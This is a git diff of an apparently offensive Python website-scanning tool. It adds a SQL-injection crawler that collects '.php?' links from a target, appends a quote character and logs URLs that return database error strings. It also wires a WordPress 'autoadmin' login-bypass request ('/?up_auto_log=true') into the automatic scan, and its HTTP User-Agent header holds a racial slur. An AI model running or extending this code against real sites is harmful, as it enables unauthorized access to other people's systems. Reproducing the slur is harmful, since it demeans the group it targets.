@@ -18,7 +18,7 @@ now = datetime.datetime.now()
 year = now.strftime('%Y')
 month = now.strftime('%m')
 Version = "v1.0"
-timeout = 2
+timeout = 10
 HEADERS = {
     'User-Agent': 'NiggerPenis-WIN!10',
     'Content-type' : '*/*',
@@ -236,8 +236,8 @@ def wp_thumbnailSlider(url):
 def autoadmin(url):
     exploit = '/?up_auto_log=true'
     admin_re_page = url + '/wp-admin/'
-    sess.get(url + exploit, timeout=5, headers=HEADERS)
-    Check_login = sess.get(admin_re_page, timeout=10, headers=HEADERS)
+    requests.get(url + exploit, timeout=5, headers=HEADERS)
+    Check_login = requests.get(admin_re_page, timeout=10, headers=HEADERS)
     if '<li id="wp-admin-bar-logout">' in str(Check_login.content):
         print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}autoadmin {PURPLE}=> {GREEN}Vuln {RESET}| {url}{exploit} ")
     else:
@@ -722,6 +722,89 @@ def serialize(url):
         )
         return result
 
+
+def Exploitt(site):
+    try:
+        GetLink = requests.get(site, timeout=10, headers=HEADERS)
+        urls = re.findall('href=[\\\'"]?([^\\\'" >]+)', str(GetLink.content))
+        #print(urls)
+        if len(urls) != 0:
+            return CheckSqliURL(site, urls)
+        
+            
+            
+        return print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}Could not find prams to test for SQL")
+    except Exception as e:
+        print(e)
+        return 
+
+
+def CheckSqliURL(site, urls):
+    MaybeSqli = []
+    try:
+        for url in urls:
+            try:
+                if ".php?" in str(url):
+                    MaybeSqli.append(site + '/' + url)
+                
+            except Exception as e:
+                print(e)
+                pass
+
+        if len(MaybeSqli) != 0:
+            return CheckSqli(MaybeSqli, site)
+        return print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}SQL Injection {PURPLE}=> {RED}Not Found")
+    except Exception as e:
+        print(e)
+        return 
+
+
+
+def CheckSqli(MaybeSqli, site):
+    for url in MaybeSqli:
+        try:
+            oop = ['MySQL','SQL','error','DB Error', 'SQL syntax;', 'mysql_fetch_assoc', 'mysql_fetch_array', 'mysql_num_rows','is_writable','mysql_result', 'pg_exec', 'mysql_result', 'mysql_num_rows', 'mysql_query', 'pg_query','System Error','io_error', 'privilege_not_granted', 'getimagesize', 'preg_match', 'mysqli_result', 'mysqli']
+            errors = [
+             'DB Error', 'SQL syntax;', 'mysql_fetch_assoc', 'mysql_fetch_array', 'mysql_num_rows',
+             'is_writable',
+             'mysql_result', 'pg_exec', 'mysql_result', 'mysql_num_rows', 'mysql_query', 'pg_query',
+             'System Error',
+             'io_error', 'privilege_not_granted', 'getimagesize', 'preg_match', 'mysqli_result', 'mysqli', 'MySQL']
+            for s in oop:
+                Checksqli = requests.get(url + "'", timeout=5, headers=HEADERS)
+                if "error" in Checksqli.text:
+                    SQLI = url.replace("'", '')
+                    print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}SQL Injection {PURPLE}=> {GREEN}Vuln{RESET} | {GREEN}{SQLI}")
+                    filename = "Results/SQLInjection.txt"
+                    with open(filename, "a+") as f:
+                        f.write(SQLI + '\n')
+
+                if s in str(Checksqli.text):
+                    SQLI = url.replace("'", '')
+                    print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}SQL Injection {PURPLE}=> {GREEN}Vuln{RESET} | {GREEN}{SQLI}")
+                    filename = "Results/SQLInjection.txt"
+                    with open(filename, "a+") as f:
+                        f.write(SQLI + '\n')
+                if "syntax" in Checksqli.text:
+                    SQLI = url.replace("'", '')
+                    print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}SQL Injection {PURPLE}=> {GREEN}Vuln{RESET} | {GREEN}{SQLI}")
+                    filename = "Results/SQLInjection.txt"
+                    with open(filename, "a+") as f:
+                        f.write(SQLI + '\n')
+                    
+                    
+                
+
+                    
+                return 
+
+            break
+        except Exception as e:
+            print(e)
+            return 
+
+
+
 def detect(url):
         """
         this module to detect cms & return type of cms.
@@ -766,7 +849,7 @@ def __getcontent__(url):
 
 
 def auto(url):
-    
+    site = url
     if url == "":
         normalerrors()
         return main()
@@ -794,7 +877,7 @@ def auto(url):
 
             dirs2(url)
             wp_dirs(url)
-            
+            #Exploitt(site) SQL Injection does not go well with Wordpress LOL
             print("")
             Exploit(url)
             print(f"\n {PURPLE}[ {GREEN}~ {RESET} Starting vulnscan! {GREEN}~{RESET} {PURPLE}]{RESET}")
@@ -807,6 +890,7 @@ def auto(url):
             Localize(url)
             tutor(url)
             boldgrid(url)
+            autoadmin(url)
             autosuggest(url)
             lol(url)
             wp_cherry(url)
@@ -818,10 +902,11 @@ def auto(url):
             audioplayer(url)
         else:
             print(f"\n {PURPLE}[ {GREEN}~ {RESET} Could not detect CMS {GREEN}~{RESET} {PURPLE}]{RESET}\n")
-            print(f" {PURPLE}[ {GREEN}~ {RESET} Starting Dirscan! {GREEN}~{RESET} {PURPLE}]{RESET}")
-            Exploit(url)
-            
+            #print(f" {PURPLE}[ {GREEN}~ {RESET} Starting Dirscan! {GREEN}~{RESET} {PURPLE}]{RESET}")
+            #Exploit(url)
+            Exploitt(site)
     except Exception as e:
+        print(e)
         print(f"\n {PURPLE}[ {GREEN}? {PURPLE}]{RESET} Connection Timout")
         return
         
@@ -951,6 +1036,9 @@ def main():
         xhelp()
     elif userinput == "mailman":
         mailman()
+    elif userinput == "sql":
+        site = input(f" {PURPLE}[ {GREEN}? {PURPLE}] {RESET}Target {PURPLE}=> {RESET}")
+        Exploitt(site)
     elif userinput == "wpversion":
         url = input(f"Site{RED}: {RESET}")
         wp_version(url)
